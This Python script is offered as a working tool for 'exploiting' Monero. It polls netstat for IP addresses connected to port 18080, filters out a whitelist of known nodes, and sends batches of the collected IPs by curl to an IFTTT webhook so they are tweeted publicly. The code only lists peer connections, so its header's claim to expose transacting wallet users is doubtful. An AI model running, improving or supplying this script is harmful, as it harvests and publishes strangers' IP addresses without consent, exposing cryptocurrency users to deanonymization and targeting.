######################
# The vulnerability that we are exploiting here is that monero wallets broadcast your ip to the entire network
# when you post a transaction.
######################

#!/bin/python

import time
import commands

print "Make sure to have the monero daemon open and running on your machine..."
print "Monero user broadcasts are on port 18080"

#This script was meant to push ips to IFTTT and then have those pushed to twitter
#You can see a working example at https://twitter.com/moneroident
IFTTTKEY = "<YOUR IFTTT API KEY>"

whitelist = ["213.114.82.127","82.161.134.181","73.150.225.122","41.193.192.187","95.148.54.164",
		"86.180.40.59","5.196.251.161","81.169.150.217","164.132.166.19","185.2.82.98",
		"37.59.97.72","51.15.58.213","73.75.254.224","138.197.182.111","184.18.173.96",
		"163.172.18.143"]
ipOldCache = ""
ipCache = ""
ipCounter = 0
while True:
	#THIS COMMAND IS TO BE USED IF YOU'RE USING A LINUX MONERO WALLET
	command = "netstat -ant | awk '{ print $5 }' | cut -d: -f1,2 | sort -u | grep 18080 | cut -d ':' -f1"

	#THIS COMMAND IS TO BE USED IF YOU'RE USING A WINDOWS 10 WALLET (RUN IT ON THE LINUX SUBSYSTEM FOR WINDOWS)
	#command = "/mnt/c/Windows/System32/cmd.exe /C netstat -ano | awk '{ print $3 }' | cut -d: -f1,2 | sort -u | grep 18080 | cut -d ':' -f1"
	netstatResult = commands.getstatusoutput(command)
	moneroUsers = str(netstatResult).split("'")[1].split('\\n')

	for moneroUser in moneroUsers:
		#Check to see if we:
		# 1. Already have this user 
		# 2. Just posted this user 
		# 3. Grabbed a monero node 
		# if we did any of the above then skip it...
		if str(moneroUser) in ipCache or str(moneroUser) in ipOldCache or any(str(moneroUser) in s for s in whitelist):
			continue
		# Filter out some stupid shit
		if len(str(moneroUser)) > 1 and "Unable" not in str(moneroUser) and "127.0.0.1" not in str(moneroUser):

			print "USER FOUND: " + moneroUser

			#Append our user to our cache
			ipCache = ipCache + moneroUser

			#Increment our user count
			ipCounter = ipCounter + 1
			#If we have 7 users then that's about all we can fit in a twitter post
			if ipCounter == 7:
				#build our IFTTT POST
				command = "curl -X POST -H \"Content-Type: application/json\" -d '{\"value1\":\"$XMR IPS:" + ipCache + " \"}' https://maker.ifttt.com/trigger/moneroips1/with/key/" + IFTTTKEY
				#Profit
				commands.getstatusoutput(command)
				#Reset our shit
				ipCounter = 0
				#Keep a cache of the last post so we don't accidently double post
				ipOldCache = ipCache
				ipCache = ""

				#nighty night
				print "SLEEPING FOR 60 min"
				time.sleep(3600)
			else:
				#add a comma so it looks pretty :-D 
				ipCache = ipCache + ", "
